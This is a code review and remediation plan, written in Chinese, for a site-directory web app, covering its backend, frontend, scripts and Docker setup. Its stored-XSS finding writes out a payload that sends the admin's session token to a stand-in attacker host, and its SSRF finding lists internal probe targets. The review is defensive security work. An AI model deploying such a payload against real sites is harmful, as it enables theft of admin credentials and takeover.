# sites-nav 代码审查修复计划（v2）

## 审查时间
2026-09-08（重新审查，覆盖上一版 6 项已过时）

## 审查范围
- 后端：app.py（约 670 行）
- 前端：static/index.html（约 1200 行）
- 启动脚本：start.bat、start.sh、run.py
- 部署：Dockerfile、docker-compose.yml、.env.example、requirements.txt、.gitignore

## 已确认已修复（不重复报告）
- `_file_lock` 单锁保护 `_load`/`_save`（但 read-modify-write 跨锁，见 #B2）
- 备份读取 `try/except OSError`
- 登录端点 401 统一（不区分未配置/密码错）
- HMAC 令牌 + `compare_digest`
- 原子写入 tmp + os.replace
- `start.bat` 用 `%%A` 不用 `!PID!`
- `start.sh` 检查 `PleaseChangeMe` 匹配 `.env.example`
- 前端 `escapeHtml`/`escapeAttr` 大体正确（#F1 例外）
- 探针同步线程 daemon 化

---

## 🔴 HIGH（必须先修）

### #B1 + #F1  存储型 XSS：`escapeHtml` 用在 HTML 属性里
- **位置**：`static/index.html:994`（同一 bug 后端无 URL 校验叠加）
- **代码**：`<a href="${escapeHtml(normalizeUrl(value))}" ...>`
- **问题**：`escapeHtml` 通过 textContent 序列化，只转义 `&<>`，**不转义 `"`**。`escapeAttr` 才是属性专用（全文其他位置都正确用了）。
- **危害**：把 `public_url` 填成 `" onload="fetch('https://attacker/?t='+sessionStorage.nav_token)`，渲染后变成 `href="http://" onload="fetch(...)"`。任何管理员点开该站点即泄露自己的 nav_token，等于 admin 完全接管。
- **修复**：
  - 前端（快）：`escapeHtml(normalizeUrl(value))` → `escapeAttr(normalizeUrl(value))`
  - 后端（根治）：`SiteIn` 加 validator 强制 URL 合法 + 拒绝控制字符：
    ```python
    @field_validator("public_url", "private_url", "domain")
    @classmethod
    def _norm_url_field(cls, v):
        v = (v or "").strip()
        if not v: return v
        if any(c.isspace() for c in v) or any(c in v for c in '"\'<>'):
            raise ValueError("URL 含非法字符")
        from urllib.parse import urlparse
        u = v if v.startswith(("http://", "https://")) else "http://" + v
        p = urlparse(u)
        if p.scheme not in ("http", "https") or not p.netloc:
            raise ValueError("URL 格式不合法")
        return v
    ```

### #B2  并发写丢失（TOCTOU）：`_load` 和 `_save` 是两次独立锁
- **位置**：`app.py:483-496`（create）、`512-529`（update）、`547-552`（delete）、`639-678`（import）
- **问题**：RLock 只保护单次读或单次写。`_load()` 返回后到 `_save()` 之间无锁，两个并发请求各读一份快照，最后一个 save 覆盖前一个，**静默丢数据**。
- **危害**：两个管理员同时编辑不同站点 → 一份编辑丢失；import 与任何写并发 → 整个批次或整个并发写丢失。
- **修复**：抽出 `_save_unlocked` + `_load_mutate(fn)` 在同一锁内做读改写：
  ```python
  def _load_mutate(fn) -> list:
      with _file_lock:
          sites = _load_unlocked()
          fn(sites)  # 抛 HTTPException 时不 save
          _save_unlocked(sites)
          return sites
  ```
  `create_site` 改为 `_load_mutate(lambda s: s.append(item))`；`update_site` 的改内体也包一层；`import_sites` 的批量 append 也走同一入口。

### #D1  默认密码 `PleaseChangeMe` 是可用凭证
- **位置**：`.env.example:2` + `docker-compose.yml:9` + `run.py:21`
- **问题**：`.env.example` 种子密码是 `PleaseChangeMe`；`start.sh:18` 和 `start.bat:41` 都识别这个哨兵并拒绝，但 **Docker 路径和 run.py 都不拦**，`app.py:466` 只判空。README 的快速启动就是 Docker 路径 → 用户照 README 跑，`PleaseChangeMe` 就是真密码。
- **修复**（三选一）：
  - 后端根治：`ADMIN_PASSWORD` 读取后 `if ADMIN_PASSWORD == "PleaseChangeMe": ADMIN_PASSWORD = ""`
  - `.env.example` 改为 `ADMIN_PASSWORD=`（空），加注释"留空 = 只读模式"
  - `run.py:21` fallback 写空值

### #D3  `start.sh:27` sed 替换注入
- **代码**：`sed -i "s/^ADMIN_PASSWORD=.*/ADMIN_PASSWORD=$ADMIN_PASSWORD/" "$ENV_FILE"`
- **问题**：密码里的 `/ \ & * [ ] 换行` 都破坏 sed。`&` 表示"整个匹配"，`\` 是转义。含 `&` 的密码会污染整个文件。
- **修复**：用 awk 重写行：
  ```sh
  awk -v p="$ADMIN_PASSWORD" -F= '$1=="ADMIN_PASSWORD"{print "ADMIN_PASSWORD=" p; next} {print}' "$ENV_FILE" > "$ENV_FILE.tmp" && mv "$ENV_FILE.tmp" "$ENV_FILE"
  ```

### #D4  Dockerfile 无 USER + 绑定挂载宿主机目录
- **位置**：`Dockerfile`（无 `USER`）+ `docker-compose.yml:15`（`./data:/app/data`）
- **问题**：容器以 UID 0 运行 + 绑定挂载宿主机路径 → 容器被打穿（经 app.py / SSRF / 反序列化漏洞）可直接写宿主机文件系统，宿主机 data/ 树变 root-owned。
- **修复**：
  ```dockerfile
  RUN addgroup --system app && adduser --system --ingroup app app && chown -R app:app /app
  USER app
  ```
  compose 侧加 `user: 1000:1000` 或用命名卷。

### #D6  `start.bat` 是 LF 行尾
- **验证**：`file start.bat` = "DOS batch file, ASCII text"；`grep -c $'\r' start.bat` = 0
- **问题**：cmd.exe 要求 CRLF。LF-only batch 文件会误解析多行构造，本文件有 `if (...) else (...)`、`for /f (...)`、`goto/pause`，可能静默失败或截断。
- **修复**：`unix2dos start.bat` 转 CRLF；加 `.gitattributes`：`*.bat text eol=crlf`

---

## 🟡 MEDIUM

### #B3  导入绕过 SiteIn 校验
- **位置**：`app.py:580-610` `_normalize_import_row` + `652-675`
- **问题**：只校验 env，其他字段无长度上限、无 pattern 校验、无 URL 校验。10 MB 备注单元格被接受并持久化，撑爆 sites.json 和所有后续 list 响应。导入行不写 `probe_status_codes`/`probe_timeout`，字段缺失。
- **修复**：导入行套一遍 `SiteIn(**...)` 校验；`import_sites` 加 `len(body.content)` 硬上限（如 10 MB）和 `len(rows)` 上限。

### #B4  导入去重用原始 URL，API 用归一化 URL
- **位置**：`app.py:643-648, 658-662` vs `415-422`
- **问题**：`existing_urls` 和 `dup_urls` 都是原始字符串，没有 `.lower()`、没有去尾斜杠、没有补 scheme。`GitLab / gitlab.company.com/` 通过导入去重但 API 会 409。两条路径产生不一致数据。
- **修复**：导入去重也走 `_norm_url`。

### #B5  每个删除 URL 都起独立线程 + Session 泄漏
- **位置**：`app.py:555-558`、`406`、`254-274`、`340-343`
- **问题**：`delete_site` 对每个候选 URL 各起一个 daemon 线程 → 一次删除 3 个 URL 就是 3 个独立线程，各自调 `_monitor_login()`、各取一次 targets 列表。Session 失效时旧对象直接丢弃，连接池泄漏。
- **修复**：每 site 单线程，`_remove_probe` 内部已能处理多 URL；Session 失效时 `.close()`。

### #B6  SSRF：URL 无 scheme/主机限制
- **位置**：`app.py:309-332`、`210-217`、`277-284`
- **问题**：`domain`/`public_url`/`private_url` 自由文本，第一个非空直接 POST 给 categraf admin 做 HTTP 探针。`http://127.0.0.1:6379/`、`http://169.254.169.254/latest/meta-data/`、`http://localhost:16260/` 都会被探测。虽然写者是 admin（信任边界"任意 admin"），但暴露内网可达性。
- **修复**：`_validate_site_payload` 加 `_assert_public(url)`：拒绝私有/环回/链路本地 IP。

### #B7  探针同步吞错无重试
- **位置**：`app.py:246-250`、`323-325`、`381-406`
- **问题**：`_dedupe_targets`/`_remove_probe`/`_register_probe` 的裸 `sess.delete()` 无状态检查，`except RequestException: pass`。admin 抖动一次就留下孤儿目标，用户看到"成功"。整条同步路径无重试。
- **修复**：抽 `_delete_target` 做 3 次指数退避重试；失败收集后写 `_sync_status` 带具体条数。

### #F2  分组卡探针状态徽章无 id
- **位置**：`index.html:1047-1049`、`791-807`
- **问题**：`refreshProbeStatus` 找 `probe-${id}` 元素，但 `groupCard` 的徽章只有 class 没有 id（只有 `siteCard` 有）。分组模式是默认 → 📡 徽章永远不更新，同步失败不可见。
- **修复**：`groupCard` 徽章加 `id="probe-${s.id}"`，或降级为全局同步指示器。

### #F3  `hasAnyUrl` 实现错误 + null 不安全
- **位置**：`index.html:961`
- **代码**：`return !!(s.domain || s.public_url || s.private_url).trim();`
- **问题**：(a) 三个都 null/undefined（纯 connection 记录）时 `.trim()` 抛 TypeError 崩整个渲染；(b) 空格-only 的 domain 是 truthy，遮蔽了有值的 public_url。
- **修复**：`!!((s.domain||"").trim() || (s.public_url||"").trim() || (s.private_url||"").trim())`

### #F4  `s.id` 未转义直接插 onclick
- **位置**：`index.html:943, 945, 946, 1020, 1021`
- **问题**：`s.name`/`s.env` 转义了，`s.id` 没有。当前 id 是 hex 安全，但 5 处不一致，且后端 `_load` 不校验 id（见 #B10）。
- **修复**：全部改 `escapeAttr(s.id)`。

### #F5  非标准 env 在默认分组模式静默丢弃
- **位置**：`index.html:829, 1035, 1036-1040`
- **问题**：env 筛选只有 全部/生产/测试，`groupCard` 只从 `["生产环境","测试环境"]` 建列。`envClassMap` 里定义了预发/开发（说明 schema 允许），但分组模式（默认）下这些记录完全消失。
- **修复**：env 列表从实际数据动态派生，或后端 Literal 只保留生产/测试。

### #F6  删除一条静默删掉同名同环境的全部记录
- **位置**：`index.html:1516-1519`
- **问题**：非分组模式下删除按 name+env 匹配，命中多条时全删，但弹窗文案只说"确定删除「X」？"。
- **修复**：命中 >1 时只删 `deleteTargetId`，或弹窗显示条数。

### #F7  `/api/sites` 响应无形状校验
- **位置**：`index.html:781`
- **问题**：直接 `sites = data`，`data` 若是 `{"detail":...}` 或 `{"items":[...]}` 则 `sites.length`/`.filter` 崩。
- **修复**：`Array.isArray(data) ? data : []`。

### #F8  无双击防抖
- **位置**：`index.html:602, 634, 672, 703`（保存/导入/删除/加监控）
- **问题**：所有异步 handler 每次点击都触发。双击"保存"发两次 POST → 重复条目。
- **修复**：handler 顶部 `btn.disabled = true`，`finally` 里恢复。

### #F9  字符串/数字 id 比较
- **位置**：`index.html:801`、`1484`、`1509/1512`
- **问题**：`Object.entries()` key 是字符串，`s.id === id` 严格比较。当前 id 通过 onclick 属性往返是字符串所以能工作，脆弱。
- **修复**：`String(x.id) === String(id)`。

### #F10  `URL.revokeObjectURL` 紧跟 `a.click()`
- **位置**：`index.html:1236`
- **问题**：同 tick 撤销可能在部分浏览器中止下载。
- **修复**：`setTimeout(0)` 或 `a.onload` 后撤销。

### #F11  表单提示文案与实际校验矛盾
- **位置**：`index.html:627`
- **问题**：文案说"域名/公网/内网至少填一个"，但实际（#1319）允许只填 connection。用户照着文案填会被拒。
- **修复**：提示里加"或连接串"。

### #D7  `.env` 默认 0644 权限
- **位置**：`start.sh:40, 27`
- **问题**：明文密码对所有本地用户可读，`cp` 继承源文件权限。
- **修复**：`umask 077` 后写；`chmod 600 "$ENV_FILE"`。

### #D8  `start.bat:86` 绑定 0.0.0.0 + `--reload`
- **问题**：Windows 本地调试脚本绑定所有网卡暴露内网目录到整个 LAN；`--reload` 是开发模式会起额外进程。
- **修复**：默认 `--host 127.0.0.1`，去掉 `--reload`（留给 run.py）。

### #D9  `run.py` 无 `os.chdir(BASE)`
- **位置**：`run.py:9-10, 50`
- **问题**：`uvicorn.run("app:app", reload=True)` 起 reload 子进程继承调用方 cwd。`python /any/where/run.py` 报 `ModuleNotFoundError: No module named 'app'`。
- **修复**：`os.chdir(BASE)` 或 `uvicorn.run(BASE / "app.py", ...)`。

### #D10  `run.py` 同样绑定 0.0.0.0
- **修复**：默认 127.0.0.1，env 可覆盖。

### #D11  docker-compose 无容器加固
- **位置**：`docker-compose.yml:14-16`
- **问题**：无 `read_only`、`cap_drop`、`security_opt`、`pids_limit`。
- **修复**：
  ```yaml
  read_only: true
  tmpfs: [/tmp]
  cap_drop: [ALL]
  security_opt: ["no-new-privileges:true"]
  pids_limit: 256
  ```

### #D12  docker-compose 无 env_file，与 .env.example/README 承诺不符
- **问题**：只注入 4 个硬编码变量，`.env` 新增变量被静默忽略。
- **修复**：加 `env_file: .env` 或更新 README。

### #D13  `start.bat:55-61` 端口匹配不精确
- **问题**：`findstr ":8000"` 子串匹配 80000-80009；`PORT_KILLED` 只杀第一个 PID，双进程占端口时 uvicorn 失败无提示。
- **修复**：`findstr /R ":8000[[:space:]]"`；循环检查直到端口真空。

### #D14  `start.bat:28` 吞掉 copy 失败
- **问题**：`copy /Y ... >nul 2>&1` 无论成功失败都打印 OK。
- **修复**：`copy ... || (echo ERROR & exit /b 1)`。

### #D15  `start.sh:22, 35` 非交互 shell 下 `read` 触发 `set -e` 退出
- **问题**：EOF/Ctrl+C 时 read 返回非零，`set -e` 让脚本退出，无诊断。
- **修复**：`read ... || { echo "no input, continuing read-only"; }`；`trap 'echo "interrupted"' EXIT`。

### #D16  README 快速启动未警告默认密码可用
- **位置**：`README.md:30, 91-96`
- **问题**：Docker quickstart 没提默认密码是真凭证；本地开发章节只写裸 uvicorn，未提 run.py/start.sh/start.bat 和 0.0.0.0 绑定。
- **修复**：加"不要带默认密码部署"警告；列出三个入口脚本。

### #D17  Dockerfile 浮动 `python:3.12-slim` tag
- **问题**：无版本/digest 固定，供应链不可控；宿主机是 CPython 3.13/3.14（有对应 pyc），容器是 3.12，行为有偏差。
- **修复**：`python:3.12.x-slim` 或 digest；对齐宿主机。

---

## 🟢 LOW

### 后端

- **#B8**  `/api/login` 无速率限制、无锁定：`app.py:464-468`。建议内存计数器，10 次/15 分钟返回 429；`TOKEN_TTL` 从 12h 降到 2h。
- **#B9**  `/api/monitor-status` 字典无 TTL、无过期清理：`app.py:53, 344, 355, 370, 401, 404`。用 monotonic 时间戳 + 30 分钟清理。
- **#B10** `id` 加载时不校验，若 sites.json 被手改是第二 XSS 向量：`app.py:126`。加载时正则 `[0-9a-f]{8}` 不匹配就重生成。
- **#B11** 损坏 sites.json 从不修复：`app.py:111-125, 153-155`。备份恢复时强制重写；`/health` 或 list 返回 `data_warning`。
- **#B12** `time.time()` 用于令牌过期 → NTP 跳变破坏：`app.py:45, 172-173, 186-187`。改 `time.monotonic()` 或生成时 clamp。

### 前端

- **#F12** 模态关闭按钮无 `aria-label`（×）
- **#F13** 可点击 span/div 无 `role="button"`/`tabindex`
- **#F14** 模态无 `role="dialog"`/`aria-modal`/焦点管理
- **#F15** toast 无 `aria-live="polite"`
- **#F16** `normalizeUrl` 把 `git://`/`ssh://`/`mailto:`/`ftp:` 拼成 `http://git://...`。修复：先判 `:/`。
- **#F17** 分组卡只显示第一个记录的 owner（`sample.owner`）
- **#F18** `siteCard` 内 `hasConn` 死变量
- **#F19** `groupCard` 内解构 `sites` 遮蔽全局 `sites`
- **#F20** 取消 monitor 后残留 `probe_status_codes`/`probe_timeout`
- **#F21** 顺序删除循环无单条反馈，中间失败已删的留在那
- **#F22** `res.skipped`/`res.skipped_count` 假设字段存在
- **#F23** `navigator.clipboard.writeText` 无 `.catch`
- **#F24** 同名同环境多记录时重复的编辑/删除按钮无区分
- **#F25** 未认证请求 401 时跳过 logout 分支，提示"加载失败"而非指向 /admin

### 部署

- **#D18** `start.bat` 无交互设置密码，Windows 用户静默只读
- **#D19** docker-compose healthcheck 无 timeout
- **#D20** compose 绑定 8000 全接口（部署正确，文档需说明）
- **#D21** compose `container_name` 固定阻塞第二实例
- **#D22** `.gitignore` 只排除 data/ 下具体文件，不是整目录
- **#D23** `.gitignore` 缺 `.vscode/`/`.idea/`/`*.log`/`*.egg-info/`/`*.bak` 等
- **#D24** Dockerfile 无 `HEALTHCHECK`
- **#D25** `run.py:6` 未用 `subprocess` 导入
- **#D26** `run.py` 无参数/环境变量解析
- **#D27** `start.sh` 无端口预检
- **#D28** `start.bat` venv 路径无引号（路径含空格会坏）
- **#D29** `start.bat` 无 `endlocal`

---

## 修复优先级

| 优先级 | 编号 | 风险 | 修复难度 |
|---|---|---|---|
| P0 立即修 | #B1+#F1 | 存储型 XSS → admin token 泄露 | 低（1 行 + 后端 validator） |
| P0 立即修 | #D3 | sed 注入污染 .env | 低（换 awk） |
| P0 立即修 | #D1 | 默认密码可用 → Docker 部署裸奔 | 低 |
| P0 立即修 | #D4 | 容器 root + 宿主机挂载 | 低（加 USER） |
| P0 立即修 | #D6 | start.bat LF 行尾 | 极低（unix2dos） |
| P1 尽快修 | #B2 | 并发写丢数据 | 中（抽 _load_mutate） |
| P1 | #B3/#B4 | 导入绕过校验/去重不一致 | 中 |
| P1 | #B5 | 线程爆炸 + Session 泄漏 | 中 |
| P1 | #B6 | SSRF | 中 |
| P1 | #B7 | 探针同步吞错 | 中 |
| P1 | #F1-F11 | 前端一组 bug | 低-中 |
| P1 | #D7-D17 | 部署一组加固 | 低-中 |
| P2 有空修 | #B8-B12, #F12-F25, #D18-D29 | 边缘/质量 | 低 |

---

## 建议修复顺序

**第一批（今天）**：#D6（unix2dos）、#B1+#F1（XSS）、#D3（sed）、#D1（密码）、#D4（Docker USER）—— 都是 5 分钟内的小改，全是真安全/数据风险。

**第二批（本周）**：#B2（TOCTOU）、#B3/#B4（导入）、#B5-B7（探针同步）、#F1-F11（前端一组）。

**第三批**：部署加固（D7-D17）+ 剩余 LOW。

---

## 已确认无问题

- 认证门禁一致：所有写接口调 `_require_admin`；`GET /api/sites` 和 `GET /api/monitor-status` 无认证只读（对内部目录合适）
- `_require_admin` 密码未配置时 fail-closed
- `_dedupe_targets` 作用域纪律：只清理当前系统候选 URL，不能删别人的目标
- 前端 `escapeHtml`/`escapeAttr` 除 #F1 外全部正确
- `confirm()` 和 `textContent` 赋值是 XSS 安全的
- 无 `setInterval` 泄漏；copy-btn 监听器每次挂在新建节点上
- `groupByEnv`/`activeCategory` 在 filterEnv→renderCategories→renderSites 的重置顺序正确
- `validProbeParams` 正则正确处理空串
- `_probe_job`/`_ENV_SUFFIX` 对 Literal 允许的两个 env 逻辑健全；`_env_suffixed` 是迁移遗留死代码
- 迁移逻辑（`app.py:127-152`）名字后缀剥离有冲突保护
- `.dockerignore` 排除 `.env`/`data/`/`__pycache__`，构建上下文无泄露
- compose 用 bind mount 而非匿名卷，README"备份=copy ./data/sites.json"说法成立
- `start.sh` 有 `set -euo pipefail`
- `app.py` `_load_env_file` 已有环境变量优先不被覆盖
